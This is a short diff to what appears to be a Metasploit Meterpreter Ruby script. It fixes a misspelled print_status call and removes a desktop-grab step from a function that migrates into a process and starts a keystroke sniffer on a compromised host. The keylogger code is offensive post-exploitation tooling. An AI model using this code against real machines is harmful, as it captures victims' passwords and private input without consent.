@@ -62,7 +62,7 @@ def explrmigrate(session,captype)
 		end
 		return true
 	rescue
-		print_staus("Failed to migrate process!")
+		print_status("Failed to migrate process!")
 		return false
 	end
 end
@@ -70,13 +70,11 @@ end
 #Function for starting the keylogger
 def startkeylogger(session)
 	begin
-		print_status("Grabbing Desktop Keyboard Input....")
-		session.ui.grab_desktop
 		print_status("Starting the keystroke sniffer...") 
 		client.ui.keyscan_start
 		return true
 	rescue
-		print_staus("Failed to start Keylogging!")
+		print_status("Failed to start Keylogging!")
 		return false
 	end
 end
